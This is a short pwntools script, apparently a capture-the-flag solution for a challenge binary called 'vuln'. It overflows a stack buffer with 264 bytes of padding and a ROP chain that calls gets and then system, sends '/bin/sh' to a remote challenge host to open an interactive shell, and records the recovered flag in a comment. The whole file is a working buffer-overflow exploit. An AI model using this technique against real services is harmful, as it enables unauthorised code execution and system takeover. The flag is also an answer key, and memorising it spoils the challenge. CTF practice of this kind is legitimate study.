from pwn import *

context.arch = "amd64"

elf = ELF("./vuln")
rop = ROP(elf)
# io = process("./vuln")
io = remote("eth007.me", 42071)
rop.gets(elf.bss(0x100))
rop.system(elf.bss(0x100))
io.sendlineafter(
    b"date?\n",
    b"x" * (256 + 8) + rop.chain(),
)
io.sendline(b"/bin/sh")
io.interactive()
# ictf{r3turn_t0_sYst3m_0r_ret2l1bc}
